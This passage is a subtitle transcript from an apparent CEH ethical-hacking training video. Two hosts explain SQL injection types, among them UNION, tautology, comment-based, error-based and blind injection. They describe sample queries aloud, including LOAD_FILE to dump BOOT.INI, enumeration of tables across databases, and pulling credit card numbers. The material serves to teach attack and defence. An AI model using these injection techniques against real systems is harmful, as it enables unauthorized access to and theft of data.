of that.\n\n145\n00:06:10.682 --> 00:06:15.101\nWe're trying to get code to execute on\nthe back end, right, on the database.\n\n146\n00:06:15.101 --> 00:06:19.175\nAnd if we can do that successfully\nwe may be able to gain an advantage,\n\n147\n00:06:19.175 --> 00:06:23.601\ndrop a data base table, gain some\nsort of admin control, re-write data,\n\n148\n00:06:23.601 --> 00:06:28.270\nmanipulate set up, there's some million\ndifferent thing we can do, right?\n\n149\n00:06:28.270 --> 00:06:29.090\nSo just be aware of that.\n\n150\n00:06:29.090 --> 00:06:30.910\nVery basic attack, by the way.\n\n151\n00:06:30.910 --> 00:06:33.820\nPeople often make this out this out to be\nsomething a lot more difficult than it is.\n\n152\n00:06:33.820 --> 00:06:38.270\nIt's gotten this kind of urban myth and\nlegend lore about it where people say,\n\n153\n00:06:38.270 --> 00:06:41.540\nthis is so hard, and my God,\nif you can learn how to do this,\n\n154\n00:06:41.540 --> 00:06:43.960\nyou're just gonna be the most\nawesome person in the world.\n\n155\n00:06:43.960 --> 00:06:45.030\nIt's hard to do.\n\n156\n00:06:45.030 --> 00:06:48.800\nDon't get me wrong, but this is not\non a scale of things that are hard.\n\n157\n00:06:48.800 --> 00:06:50.855\nWe have talked about, demonstrated, and\n\n158\n00:06:50.855 --> 00:06:54.453\nactually worked through in all\nthe different episodes we've been through\n\n159\n00:06:54.453 --> 00:06:57.608\ninside the CEH Body of knowledge\nwe've been going through here.\n\n160\n00:06:57.608 --> 00:07:01.497\nWe have gone through stuff that's a lot\nmore difficult than SQL injection attacks.\n\n161\n00:07:01.497 --> 00:07:06.471\nThe hard part about SQL injection is\nyou've gotta understand and learn the SQL\n\n162\n00:07:06.471 --> 00:07:12.273\ncommands and the language essentially that\nyou choose, whether it's Microsoft's SQL,\n\n163\n00:07:12.273 --> 00:07:16.512\nwhether it is Open SQL, Postgres or\nPSQL, whether it's Oracle.\n\n164\n00:07:16.512 --> 00:07:20.841\nAll these relational databases as we've\npointed out, run SQL in some form,\n\n165\n00:07:20.841 --> 00:07:23.080\nsome derivative of the language.\n\n166\n00:07:23.080 --> 00:07:24.460\nYou've gotta understand that and\n\n167\n00:07:24.460 --> 00:07:26.875\nessentially this is learning how\nto speak a new language, right?\n\n168\n00:07:26.875 --> 00:07:27.930\n&gt;&gt; Uh-huh.\n&gt;&gt; And that's really\n\n169\n00:07:27.930 --> 00:07:28.800\nwhat the hard part is.\n\n170\n00:07:28.800 --> 00:07:32.590\nIf you then get that, after that,\nit's really just a question of choosing\n\n171\n00:07:32.590 --> 00:07:36.680\nthe appropriate phrase to accomplish\nwhat you're looking to do.\n\n172\n00:07:36.680 --> 00:07:40.541\nWhen you are thinking about this,\ndon't overlook the value of going out and\n\n173\n00:07:40.541 --> 00:07:43.511\nfinding some guidance,\nif you're gonna practice this.\n\n174\n00:07:43.511 --> 00:07:47.695\nAnd remember, we've told you in several\nplaces throughout our time together,\n\n175\n00:07:47.695 --> 00:07:51.569\nyou at your own risk and at your own\nperil, take this skills offensively and\n\n176\n00:07:51.569 --> 00:07:54.299\ntry to deploy them in the real\nworld against others.\n\n177\n00:07:54.299 --> 00:07:56.264\nThat's not acceptable,\nit's not allowed and\n\n178\n00:07:56.264 --> 00:07:57.992\nit's not something you should be doing.\n\n179\n00:07:57.992 --> 00:08:01.742\nBut using in any close environment\nto test and figure out for yourself,\n\n180\n00:08:01.742 --> 00:08:03.380\nis perfectly acceptable.\n\n181\n00:08:03.380 --> 00:08:08.250\nSo, with that disclaimer, write big little\nasterisk can big flashing please don't\n\n182\n00:08:08.250 --> 00:08:12.720\ndo this at home unless you're willing\nto take the risk on as a disclaimer.\n\n183\n00:08:12.720 --> 00:08:16.760\nYou should not be afraid to go out and\nGoogle for SQL injection or\n\n184\n00:08:16.760 --> 00:08:19.380\nSQL cheat sheets because\nyou're gonna find out there,\n\n185\n00:08:19.380 --> 00:08:23.720\nthere are many of them on the web that\nwill allow you to start to begin to build\n\n186\n00:08:23.720 --> 00:08:26.850\na little repository,\na library of the code snippets you need,\n\n187\n00:08:26.850 --> 00:08:30.600\nwith explanations traditionally more\noften than not about how they work, so\n\n188\n00:08:30.600 --> 00:08:32.760\nthat you could start to sample\nthis stuff and figure it out.\n\n189\n00:08:32.760 --> 00:08:35.610\nSo, it's a good way for\nyou to learn more about this.\n\n190\n00:08:35.610 --> 00:08:39.670\nBut obviously, you have to then take\nthe next step and be proactive and\n\n191\n00:08:39.670 --> 00:08:42.220\ntry to do that on your own and\nthen test them.\n\n192\n00:08:42.220 --> 00:08:44.430\nJust because, somebody wrote it\ndown on a cheat sheets somewhere,\n\n193\n00:08:44.430 --> 00:08:45.300\ndoes means is gonna work.\n\n194\n00:08:45.300 --> 00:08:47.110\nNumber one, they may made mistake and\n\n195\n00:08:47.110 --> 00:08:49.620\nnumber two it may not work\nin every instance because,\n\n196\n00:08:49.620 --> 00:08:54.110\nnot every database is going to be the\nsame, right, and so actually a good idea.\n\n197\n00:08:54.110 --> 00:08:57.430\nCan we go to the demo drive for\njust a second,\n\n198\n00:08:57.430 --> 00:09:01.650\nsince we're talking about database\ndifferences and all that kind of stuff?\n\n199\n00:09:01.650 --> 00:09:02.520\nLet me show you what I mean here.\n\n200\n00:09:02.520 --> 00:09:05.730\nI'm was gonna save this for later,\nbut, since we're talking about it now,\n\n201\n00:09:05.730 --> 00:09:07.290\nlet me show you what I'm talking about.\n\n202\n00:09:07.290 --> 00:09:10.440\nSo, if you take a look at some of\nthe sample code I have up on the screen,\n\n203\n00:09:11.680 --> 00:09:15.610\nthe very top ones show the BOOT.INI\nusing a hex-based SQL injection.\n\n204\n00:09:15.610 --> 00:09:20.960\nIf you look at the code, SELECT LOAD_FILE\nand then hex string, and then, and this\n\n205\n00:09:20.960 --> 00:09:25.350\nis gonna let you with the system is going\nto have a boot INI file available to you.\n\n206\n00:09:25.350 --> 00:09:30.620\nPotentially dump the boot INI file\nfrom the command injection, right.\n\n207\n00:09:30.620 --> 00:09:31.940\nSo, I can do this.\n\n208\n00:09:31.940 --> 00:09:33.820\nSee if I can highlight that just.\n\n209\n00:09:33.820 --> 00:09:35.590\nYeah, there you go.\nYou probably see a little bit better\n\n210\n00:09:35.590 --> 00:09:36.850\none I offset like that.\n\n211\n00:09:36.850 --> 00:09:38.305\nAnd that's actually gonna let me do that.\n\n212\n00:09:38.305 --> 00:09:41.520\nNow, you have to reproduce that\nhex string and know the command.\n\n213\n00:09:41.520 --> 00:09:42.700\nBut you can look that up on the web.\n\n214\n00:09:42.700 --> 00:09:43.828\nThat's easy to figure out.\n\n215\n00:09:43.828 --> 00:09:48.320\nWhen we talked about different\ntakes on a theme, I went ahead and\n\n216\n00:09:48.320 --> 00:09:51.260\nI put together the same exact command.\n\n217\n00:09:51.260 --> 00:09:55.020\nHow we get user-defined tables\nusing a SQL code injection for\n\n218\n00:09:55.020 --> 00:09:59.628\nMicrosoft's SQL database, for\na MySQL database and for Oracle.\n\n219\n00:09:59.628 --> 00:10:03.890\nAnd you could see that there\nare differences in the code across each\n\n220\n00:10:03.890 --> 00:10:08.200\none of these and Microsoft SQL, it would\nbe, I didn't highlight that correctly.\n\n221\n00:10:08.200 --> 00:10:09.210\nLet me just go over here.\n\n222\n00:10:09.210 --> 00:10:11.380\nIt would be select and\n\n223\n00:10:11.380 --> 00:10:16.650\nyou can see your name from CIS objects\nwhere x types equals u for user defined.\n\n224\n00:10:16.650 --> 00:10:20.196\nWhen we do user defined table in MySQL,\nit's gonna be a little bit different.\n\n225\n00:10:20.196 --> 00:10:24.918\nWe're gonna have select table name\nfrom Information_schema tables\n\n226\n00:10:24.918 --> 00:10:30.200\nwhere table_schema equals, and\nthen table name and the defined item.\n\n227\n00:10:30.200 --> 00:10:34.840\nAnd then in Oracle, it's gonna be\nselect asterisk from all tables,\n\n228\n00:10:34.840 --> 00:10:37.020\nwhere owner equals database name.\n\n229\n00:10:37.020 --> 00:10:39.420\nAnd so\ndepending on how we choose to do this,\n\n230\n00:10:40.530 --> 00:10:45.610\nwhat system we are targeting, we're\ngonna have to write a different type of\n\n231\n00:10:45.610 --> 00:10:49.720\ncode to essentially attach to that\nspecific instance of the database, right?\n\n232\n00:10:49.720 --> 00:10:51.060\n&gt;&gt; And at first we might not know.\n\n233\n00:10:51.060 --> 00:10:54.590\nWe might not know that they're\nsusceptible to SQL injection but\n\n234\n00:10:54.590 --> 00:10:57.560\nwe might know what that database\nis on the back end at that point.\n\n235\n00:10:57.560 --> 00:11:00.210\n&gt;&gt; Correct, and we're not gonna get in\non all the specifics on how to tell what\n\n236\n00:11:00.210 --> 00:11:02.480\ndatabase is so we're running,\nthat's not hard to do.\n\n237\n00:11:02.480 --> 00:11:04.405\nThere are SQL commands that will do that,\n\n238\n00:11:04.405 --> 00:11:06.775\nwe're not gonna demo that\nkind of stuff right now.\n\n239\n00:11:06.775 --> 00:11:08.390\nBut this, absolutely, you're right.\n\n240\n00:11:08.390 --> 00:11:10.370\nWe have to, think about our methodology.\n\n241\n00:11:10.370 --> 00:11:12.620\nWe have to do a little recon,\na little fingerprinting,\n\n242\n00:11:12.620 --> 00:11:15.160\na little footprinting to\nunderstand what's happening there.\n\n243\n00:11:15.160 --> 00:11:18.420\nAnd then, position ourselves\nto be able to, step by step,\n\n244\n00:11:18.420 --> 00:11:19.858\nincrementally build that knowledge.\n\n245\n00:11:19.858 --> 00:11:22.620\nSo that's gonna be very important for\nus to think about as well.\n\n246\n00:11:22.620 --> 00:11:25.420\nCan we go back to the-\n&gt;&gt; Mm-hm.\n\n247\n00:11:25.420 --> 00:11:26.678\n&gt;&gt; There, yeah, that thing, right exactly.\n\n248\n00:11:26.678 --> 00:11:28.488\n[LAUGH] Let's go back to\nthat thing right there.\n\n249\n00:11:28.488 --> 00:11:32.110\nSo we were talking about the fact that\nobviously a very basic attack gain\n\n250\n00:11:32.110 --> 00:11:36.960\neither unauthorized access or\nsome form of direct control and\n\n251\n00:11:36.960 --> 00:11:40.750\nit's a flaw in the web app, right, that\nis really allowing this to take place.\n\n252\n00:11:40.750 --> 00:11:43.170\nNot the database or\nthe web server directly, right,\n\n253\n00:11:43.170 --> 00:11:44.850\nthat's what we have to understand.\n\n254\n00:11:44.850 --> 00:11:48.467\nBut because the database runs SQL\ncommands, if we can get them there,\n\n255\n00:11:48.467 --> 00:11:51.531\nthe database is gonna of course\nrun them if we provide them,\n\n256\n00:11:51.531 --> 00:11:54.610\nif they're provided in\na seemingly legitimate way.\n\n257\n00:11:54.610 --> 00:11:56.884\n&gt;&gt; Yeah, it's one of the things\nI think people miss sometimes.\n\n258\n00:11:56.884 --> 00:12:00.771\nWhen you're talking about SQL injection\nis they think it's a flaw in the database\n\n259\n00:12:00.771 --> 00:12:04.220\napplication, in the database engine and\nit has nothing to do with that.\n\n260\n00:12:04.220 --> 00:12:08.740\nThe database engine is doing exactly what\nit is supposed to do, the command is being\n\n261\n00:12:08.740 --> 00:12:12.060\nsubmitted, it's dropping the table or\nit's querying the tables or\n\n262\n00:12:12.060 --> 00:12:15.540\nit's returning the information\njust like it's supposed to.\n\n263\n00:12:15.540 --> 00:12:19.430\nIt's the web app or\nthe web server that's allowing those\n\n264\n00:12:19.430 --> 00:12:21.850\ncommands to get back to\nthe server in the first place.\n\n265\n00:12:21.850 --> 00:12:23.730\nThey should have been stopped\nwell before it got to.\n\n266\n00:12:23.730 --> 00:12:29.755\nBut in patching SQL or Oracle or whatever,\nis not gonna prevent SQL injection.\n\n267\n00:12:29.755 --> 00:12:32.880\n&gt;&gt; No, no, not to directly but\nhaving said that one subtle point.\n\n268\n00:12:32.880 --> 00:12:33.970\nAnd you raise a very good point.\n\n269\n00:12:33.970 --> 00:12:36.370\nIt's very important to distinguish here.\n\n270\n00:12:36.370 --> 00:12:37.660\nBut, let's build on that.\n\n271\n00:12:37.660 --> 00:12:38.960\nLet's be a little bit more refined.\n\n272\n00:12:38.960 --> 00:12:41.990\nLet's split a hair, if you will.\n\n273\n00:12:41.990 --> 00:12:45.920\nSo what Mike says is absolutely correct,\nwith one little minor adjustment,\n\n274\n00:12:45.920 --> 00:12:50.980\nwhich is that we have to make\nsure that we're always patching\n\n275\n00:12:50.980 --> 00:12:52.310\nacross the board as we know.\n\n276\n00:12:52.310 --> 00:12:53.980\n&gt;&gt; Right.\n&gt;&gt; All of our systems including, and\n\n277\n00:12:53.980 --> 00:12:56.930\npeople sometimes forget this,\ndatabases are applications,\n\n278\n00:12:56.930 --> 00:12:58.340\nthat doesn't mean they don't have errors.\n\n279\n00:12:58.340 --> 00:13:00.100\nAnd it doesn't mean they\ndon't need path check.\n\n280\n00:13:00.100 --> 00:13:04.106\nAnd we have to make sure we keep them\nup-to-date because there are specific\n\n281\n00:13:04.106 --> 00:13:08.428\nattacks, specific SQL injection attacks,\nthat could be executed by version and\n\n282\n00:13:08.428 --> 00:13:10.011\nby type, as you were saying.\n\n283\n00:13:10.011 --> 00:13:14.783\nAnd so if we're not keeping the security\npatching up-to-date on the database,\n\n284\n00:13:14.783 --> 00:13:18.864\nwe may actually open up additional\nvulnerabilities that may or may not\n\n285\n00:13:18.864 --> 00:13:23.590\nbe there, probably would not normally\nbe there, if we were actually patching.\n\n286\n00:13:23.590 --> 00:13:27.210\nAnd so while it is a small distinction,\nit's an important one because the version\n\n287\n00:13:27.210 --> 00:13:30.710\ndoes play a part in what we can actually\nexecute because a lot of times later\n\n288\n00:13:30.710 --> 00:13:34.630\nversions of databases are patched for\nearlier problems.\n\n289\n00:13:34.630 --> 00:13:37.540\nAnd so that is something to consider and\nthink about as well.\n\n290\n00:13:37.540 --> 00:13:40.420\nSo it's just,\nit's an important distinction for us.\n\n291\n00:13:40.420 --> 00:13:44.780\nIt doesn't play directly into the fact\nthat an attack can occur as Mike pointed\n\n292\n00:13:44.780 --> 00:13:48.740\nout, and he's absolutely right to\nsay that and to remind us of that.\n\n293\n00:13:48.740 --> 00:13:52.630\nBut it does potentially open the door for\nadditional exploits that\n\n294\n00:13:52.630 --> 00:13:57.470\nwe maybe able to deal with patch and\nor create a defense\n\n295\n00:13:57.470 --> 00:14:01.010\nagainst if we're smart about our patching\nand if we're not, we may fall prey to it.\n\n296\n00:14:01.010 --> 00:14:04.120\nAnd so it is a subtle but\nstill important distinction.\n\n297\n00:14:04.120 --> 00:14:06.390\nSo speaking of attacks and attack types.\n\n298\n00:14:06.390 --> 00:14:07.610\nLet's scroll down there.\n\n299\n00:14:07.610 --> 00:14:11.740\nSo I believe we have this nice little list\nof types of SQL Injection attacks that\n\n300\n00:14:11.740 --> 00:14:12.640\nwe have created.\n\n301\n00:14:12.640 --> 00:14:17.090\nYeah, we often talk about two distinct\ncategories of SQL Injections.\n\n302\n00:14:17.090 --> 00:14:18.420\nError based SQL Injections,\n\n303\n00:14:18.420 --> 00:14:24.000\nwe subdivided that into a list of five\ndifferent types that will occur there.\n\n304\n00:14:24.000 --> 00:14:27.485\nWe'll go through those in a minute and\nthen blind SQL Injection is a category.\n\n305\n00:14:27.485 --> 00:14:30.650\nWe've got a couple of types there, so\nwe're going to want to walk through.\n\n306\n00:14:30.650 --> 00:14:33.940\nI gave you a couple examples of\nsome code that we may use and or\n\n307\n00:14:33.940 --> 00:14:35.010\njust generically see.\n\n308\n00:14:35.010 --> 00:14:36.750\nSo we're gonna take a look\nat this real quick.\n\n309\n00:14:36.750 --> 00:14:41.600\nSo, UNION SQL Injection, this is where\nwe're gonna use a UNION SELECT statement.\n\n310\n00:14:41.600 --> 00:14:43.740\nSo it's in quotes there\njust to show us that.\n\n311\n00:14:43.740 --> 00:14:47.280\nThis returns the union of the intended\ndataset with with the target dataset.\n\n312\n00:14:47.280 --> 00:14:48.840\nA UNION is a combined, right?\n\n313\n00:14:48.840 --> 00:14:49.830\nEssentially, right?\n\n314\n00:14:49.830 --> 00:14:50.670\nYou know all about UNION.\n\n315\n00:14:50.670 --> 00:14:53.650\nThat's something you're\ngonna be pursuing later on.\n\n316\n00:14:53.650 --> 00:14:54.190\n&gt;&gt; Yeah.\n&gt;&gt; Right,\n\n317\n00:14:54.190 --> 00:14:58.630\nso the idea now is we're gonna\njoin two things together, right?\n\n318\n00:14:58.630 --> 00:15:01.580\nAnd so when we do a select,\nthe first select statement there.\n\n319\n00:15:01.580 --> 00:15:04.250\nWe're going in and we're doing, we're\ngonna select whatever name, phone number,\n\n320\n00:15:04.250 --> 00:15:05.430\naddress, this is just random stuff.\n\n321\n00:15:05.430 --> 00:15:08.130\nIt's really just whatever\nwe might selecting from,\n\n322\n00:15:08.130 --> 00:15:11.370\nwherever we're selecting it\nfrom the users table let's say.\n\n323\n00:15:11.370 --> 00:15:12.990\nWe're an ID is equal to whatever.\n\n324\n00:15:12.990 --> 00:15:14.750\nSo an ID of whatever.\n\n325\n00:15:14.750 --> 00:15:18.280\nUnion all, combine that,\njoin that with the next one,\n\n326\n00:15:18.280 --> 00:15:21.890\nSELECT creditCardNumbers\nright FROM CreditCardTable.\n\n327\n00:15:21.890 --> 00:15:24.690\nAnd so\nwhen we do a UNION SELECT Injection,\n\n328\n00:15:24.690 --> 00:15:28.890\nwe're trying to essentially grab\ndifferent bits of data, map them and\n\n329\n00:15:28.890 --> 00:15:31.750\nreturn them back the way\na query would normally.\n\n330\n00:15:31.750 --> 00:15:35.200\nSo that way we could say,\nlook up this value in this table.\n\n331\n00:15:35.200 --> 00:15:37.170\nCross reference it with\nthat value in that table.\n\n332\n00:15:37.170 --> 00:15:41.706\nBring me the people with that credit card\nnumbers from the zip code with this last\n\n333\n00:15:41.706 --> 00:15:45.293\nname or whatever the craziness\nwould be that we wanna know, and\n\n334\n00:15:45.293 --> 00:15:46.592\nwe could then zero in.\n\n335\n00:15:46.592 --> 00:15:50.986\nAnd so UNION SQL Injection allows us\nto do what a database is good at.\n\n336\n00:15:50.986 --> 00:15:53.628\nStore a whole bunch of data,\ncross reference it, and\n\n337\n00:15:53.628 --> 00:15:57.870\nthen present it based on a request from a\nuser to Be able to slice and dice, right?\n\n338\n00:15:57.870 --> 00:15:59.556\nSo that's what we're gonna see there.\n\n339\n00:15:59.556 --> 00:16:03.908\nI'm glad you concur by the way, thank you\nvery much cuz if you didn't concur we'd\n\n340\n00:16:03.908 --> 00:16:08.259\nbe done, we have to re shoot this entire\nepisode and you know, that would just be,\n\n341\n00:16:08.259 --> 00:16:10.050\nit would just be, what can I say?\n\n342\n00:16:10.050 --> 00:16:12.830\nSo all right, so,\nsystem stored procedure, right?\n\n343\n00:16:12.830 --> 00:16:15.240\nSo, you know, anything,\nwe call them SP's traditionally, right?\n\n344\n00:16:15.240 --> 00:16:16.910\nStore procedures.\n\n345\n00:16:16.910 --> 00:16:19.676\nSo, when we think about store procedures,\n\n346\n00:16:19.676 --> 00:16:25.230\nwe're thinking about code essentially that\nis going to be referenced by the database.\n\n347\n00:16:25.230 --> 00:16:28.734\nThis is something that normally is\na part of the database itself, so\n\n348\n00:16:28.734 --> 00:16:30.560\nit's sitting on the database.\n\n349\n00:16:30.560 --> 00:16:34.970\nWe can call it for maintenance, for\nsome sort of a task we may run.\n\n350\n00:16:34.970 --> 00:16:37.800\nHey run a backup and\nclean up those tables.\n\n351\n00:16:37.800 --> 00:16:41.310\nGo ahead and look at all the tables\nif there's any cross link records.\n\n352\n00:16:41.310 --> 00:16:43.550\nLet's go ahead and de-link them and\nclean the tables up.\n\n353\n00:16:43.550 --> 00:16:45.070\nLet's normalize that data.\n\n354\n00:16:45.070 --> 00:16:47.200\nThere's always things store\nprocedures are used to do.\n\n355\n00:16:47.200 --> 00:16:50.200\nSome are small, some are big,\nsome take a small amount of time,\n\n356\n00:16:50.200 --> 00:16:51.820\nsome take a long amount of time.\n\n357\n00:16:51.820 --> 00:16:54.677\nThe ideas that we're pre-loading and\npre-writing and\n\n358\n00:16:54.677 --> 00:16:56.860\ntherefore storing the positioning.\n\n359\n00:16:56.860 --> 00:16:59.508\nThings that are often gonna\nhave to be done repetitively.\n\n360\n00:16:59.508 --> 00:17:00.348\nThen we're gonna use those.\n\n361\n00:17:00.348 --> 00:17:01.770\nSo we're just gonna call them up.\n\n362\n00:17:01.770 --> 00:17:04.340\nEvery database right any\nenterprise database,\n\n363\n00:17:04.340 --> 00:17:07.540\nlet's put it that way Is gonna have\nstored procedures associated with it.\n\n364\n00:17:07.540 --> 00:17:11.290\nSo the goal from the attacks perspective\nwould be to know what they are,\n\n365\n00:17:11.290 --> 00:17:14.980\nknow that we may be able to leverage\nthem if necessary to perpetrate\n\n366\n00:17:14.980 --> 00:17:16.620\nsome sort of an attack.\n\n367\n00:17:16.620 --> 00:17:21.060\nAnd if we have a list of the database\nstore procedures based on database type\n\n368\n00:17:21.060 --> 00:17:23.100\nmakes it a lot easier to zero in and\nfigure that out.\n\n369\n00:17:23.100 --> 00:17:25.094\nSee, that's just kinda what\nwe're talking about there.\n\n370\n00:17:25.094 --> 00:17:27.416\nWhat about tautology.\n\n371\n00:17:27.416 --> 00:17:28.814\nThat could be our word for the episode.\n\n372\n00:17:28.814 --> 00:17:29.589\n&gt;&gt; I like that word.\n\n373\n00:17:29.589 --> 00:17:30.692\n&gt;&gt; That is a good word, right?\n\n374\n00:17:30.692 --> 00:17:32.877\n&gt;&gt; It is.\n&gt;&gt; Let's write up there with some of\n\n375\n00:17:32.877 --> 00:17:36.342\nthe other sparkling examples\nof language that we have had.\n\n376\n00:17:36.342 --> 00:17:38.109\nSo we may we have to go with that one.\n\n377\n00:17:38.109 --> 00:17:38.747\n&gt;&gt; I think so.\n\n378\n00:17:38.747 --> 00:17:39.413\n&gt;&gt; That's a cool one.\n\n379\n00:17:39.413 --> 00:17:42.900\nAll right, so tautology is the word\nof the day, boys and girls.\n\n380\n00:17:42.900 --> 00:17:46.450\nSo tautology attacks where we injects\nstatements that where always true.\n\n381\n00:17:46.450 --> 00:17:48.259\nRight.\nSo queries will always return results\n\n382\n00:17:48.259 --> 00:17:49.963\nupon evaluation of a WHERE condition.\n\n383\n00:17:49.963 --> 00:17:52.850\nSo if we know something that is\nalways gonna resolved to true.\n\n384\n00:17:52.850 --> 00:17:54.570\nWe can use that to our advantage.\n\n385\n00:17:54.570 --> 00:18:00.106\nRight, so select from users where\nname is Set to OR or 1 equals 1.\n\n386\n00:18:00.106 --> 00:18:02.563\nWe could be looking for\na user that's always an admin right?\n\n387\n00:18:02.563 --> 00:18:05.650\nAnd we can pull that credential for\ninstance and things like that.\n\n388\n00:18:05.650 --> 00:18:09.750\nSo if we know that to be true,\nwe can use that to our advantage.\n\n389\n00:18:09.750 --> 00:18:15.120\nThat's what tautology injection attacks\nare gonna be like end of line comments.\n\n390\n00:18:15.120 --> 00:18:19.150\nSo when we think about this after we\ninject code into a particular field,\n\n391\n00:18:19.150 --> 00:18:22.500\nany legitimate code that follows is\nnullified through the use of just\n\n392\n00:18:22.500 --> 00:18:23.930\nthe end of line command.\n\n393\n00:18:23.930 --> 00:18:26.670\nAnd that get's rid of anything\nthat will follow after it.\n\n394\n00:18:26.670 --> 00:18:30.721\nAnd so we get essentially null it out or\nrem it and then we're gonna ignore it.\n\n395\n00:18:30.721 --> 00:18:35.142\nAnd so we may be able to use that to\nour advantage as well, either to put in\n\n396\n00:18:35.142 --> 00:18:39.788\ncommands or to put in code that may look\nnormal when it's sent and parsed but\n\n397\n00:18:39.788 --> 00:18:41.080\nis really ignored.\n\n398\n00:18:41.080 --> 00:18:43.860\nSo that may help us to stealth the attack\nin theory if you want to think of it that\n\n399\n00:18:43.860 --> 00:18:47.930\nway, or we may be able to\nmanipulate the string blocking out\n\n400\n00:18:47.930 --> 00:18:52.070\ncertain information and allowing always\ncertain information to be processed.\n\n401\n00:18:52.070 --> 00:18:54.930\nA lot of times,\nthis is done to get this kind of code\n\n402\n00:18:54.930 --> 00:18:58.300\nsnuck through some sort of a filter but\nthen, obviously,\n\n403\n00:18:58.300 --> 00:19:03.100\nthe database knows it should ignore, let's\nsay half of the code or whatever is there.\n\n404\n00:19:03.100 --> 00:19:05.373\nSo we make it window dressing essentially.\n\n405\n00:19:05.373 --> 00:19:08.875\nMaking it looking like it's actually\nlegitimate when in fact it's not and\n\n406\n00:19:08.875 --> 00:19:11.270\nwe just drop all the code\nafter the comment.\n\n407\n00:19:11.270 --> 00:19:14.180\nAnd we only execute the part that\nwe want to run the attack on.\n\n408\n00:19:14.180 --> 00:19:15.426\nSo it's like hiding in plain sight.\n\n409\n00:19:15.426 --> 00:19:17.469\n&gt;&gt; It is.\n&gt;&gt; So to speak right?\n\n410\n00:19:17.469 --> 00:19:20.708\nLast one in this category of\nerror based SQL injection.\n\n411\n00:19:20.708 --> 00:19:25.408\nIs illegal or logically incorrect queries,\nessentially queries that are purposely\n\n412\n00:19:25.408 --> 00:19:28.213\nmalformed to cause\nthe database to self destruct,\n\n413\n00:19:28.213 --> 00:19:32.668\ndo some sort of an error condition where\nthey'll throw an exception or an error.\n\n414\n00:19:32.668 --> 00:19:36.659\nWe purposely write queries in a way\nthat we know is gonna cause an error but\n\n415\n00:19:36.659 --> 00:19:39.130\nagain this is the subtlety of this right.\n\n416\n00:19:39.130 --> 00:19:42.920\nWe're looking to cause certain kinds of\nerrors based on the kind of database in\n\n417\n00:19:42.920 --> 00:19:43.920\nthe build version.\n\n418\n00:19:43.920 --> 00:19:48.870\nSo we'll probe databases looking for\ncertain errors happening a certain way\n\n419\n00:19:48.870 --> 00:19:53.330\nin response to certain code to tell\nus that it's this kind of database.\n\n420\n00:19:53.330 --> 00:19:56.250\nWhich then lets us figure out how\nwe want to manipulate the other\n\n421\n00:19:56.250 --> 00:19:58.810\nattacks in order to\ntarget them specifically.\n\n422\n00:19:58.810 --> 00:19:59.840\nIt's kind of devious.\n\n423\n00:19:59.840 --> 00:20:00.400\n&gt;&gt; It is.\n\n424\n00:20:00.400 --> 00:20:01.984\n&gt;&gt; Also deviant, but\nwe won't get into that whole thing, right?\n\n425\n00:20:01.984 --> 00:20:03.251\n&gt;&gt; [LAUGH]\n&gt;&gt; But\n\n426\n00:20:03.251 --> 00:20:05.310\nit is kind of devious\nif you think about it.\n\n427\n00:20:05.310 --> 00:20:08.267\nWe're gonna probe, and this is not\nthe only place we do this, by the way.\n\n428\n00:20:08.267 --> 00:20:12.739\nWe do this with seen flag or\nnot seen seen flags or rather we do,\n\n429\n00:20:12.739 --> 00:20:17.211\nwhat am I thinking of, ping of def for\ninstance is unique to and\n\n430\n00:20:17.211 --> 00:20:22.041\ntied to a certain OS type,\nright to work on Linux, Unix machines.\n\n431\n00:20:22.041 --> 00:20:28.540\nWe think about null scans, we think about\nfin scans, we think about reset scans.\n\n432\n00:20:28.540 --> 00:20:32.770\nAll these kind of scans so we do with N\nmap or Zen map or whatever where we're\n\n433\n00:20:33.820 --> 00:20:36.870\ntrying to push buttons on the network\nside as we're probing to figure\n\n434\n00:20:36.870 --> 00:20:40.400\nout what kind of OS is on the other side,\nbecause certain OS's behave a certain way.\n\n435\n00:20:40.400 --> 00:20:43.550\nIf you send the reset packet to a Windows\nOS you gotta different response and\n\n436\n00:20:43.550 --> 00:20:45.240\nif you do a Linux Unix box and\n\n437\n00:20:45.240 --> 00:20:49.100\nas a result we can use that to zero in\non the kind of a OS we're dealing with.\n\n438\n00:20:49.100 --> 00:20:52.413\nThat's the same thought process here\nwith regards to SQL injection attacks.\n\n439\n00:20:52.413 --> 00:20:55.873\nBut turned to the database,\nas opposed to targeting the network stack.\n\n440\n00:20:55.873 --> 00:20:59.420\nSo it's the same idea, but just actually\ndone from a different perspective.\n\n441\n00:20:59.420 --> 00:21:00.178\n&gt;&gt; Very cool.\n\n442\n00:21:00.178 --> 00:21:01.038\n&gt;&gt; Tada.\n\n443\n00:21:01.038 --> 00:21:02.498\n&gt;&gt; [LAUGH]\n&gt;&gt; All right.\n\n444\n00:21:02.498 --> 00:21:03.990\nLet's go back and continue talking.\n\n445\n00:21:03.990 --> 00:21:05.275\nWe have another category.\n\n446\n00:21:05.275 --> 00:21:06.879\nThis is blind SQL injection.\n\n447\n00:21:06.879 --> 00:21:08.415\nWe have two types there.\n\n448\n00:21:08.415 --> 00:21:13.759\nThe blind SQL injection is going to\nallow us even if it's time delay.\n\n449\n00:21:13.759 --> 00:21:18.590\nAnd we're essentially, we are playing\nwith time the values and TTL values.\n\n450\n00:21:18.590 --> 00:21:19.590\nThe processing.\n\n451\n00:21:19.590 --> 00:21:23.730\nI mentioned this a little bit in the\nhacking web applications episodes that we\n\n452\n00:21:23.730 --> 00:21:28.580\ndid before this, were you can go in and\nmodify the timing.\n\n453\n00:21:28.580 --> 00:21:34.000\nAnd we also talk about this in the, I\nthink in the hacking web server episodes.\n\n454\n00:21:34.000 --> 00:21:39.880\nBut also in the session hijacking,\nwhere we talk about different attacks and\n\n455\n00:21:39.880 --> 00:21:42.590\nfragment, how big a role\nfragmentation attacks play.\n\n456\n00:21:42.590 --> 00:21:45.360\nBut the fact that we could\nbreak up the attack packets,\n\n457\n00:21:45.360 --> 00:21:50.270\nsend them through because of\nmanipulation of timing at the IDS.\n\n458\n00:21:50.270 --> 00:21:52.650\nWe may be able to skirt the IDS or\n\n459\n00:21:52.650 --> 00:21:55.390\nnot have it to pay attention\nto firewalls as well.\n\n460\n00:21:55.390 --> 00:21:58.518\nNot have it pay attention to all\nthe packets because they don't see them as\n\n461\n00:21:58.518 --> 00:22:01.243\nbeing part of the same session if\nwe manipulate those values, so\n\n462\n00:22:01.243 --> 00:22:03.784\ntime delay is something we use\nin a lot of different places.\n\n463\n00:22:03.784 --> 00:22:05.159\nAnd it can be used here as well.\n\n464\n00:22:05.159 --> 00:22:07.282\n&gt;&gt; Mm-hm.\n&gt;&gt; I'm in Boolean Exploitation,\n\n465\n00:22:07.282 --> 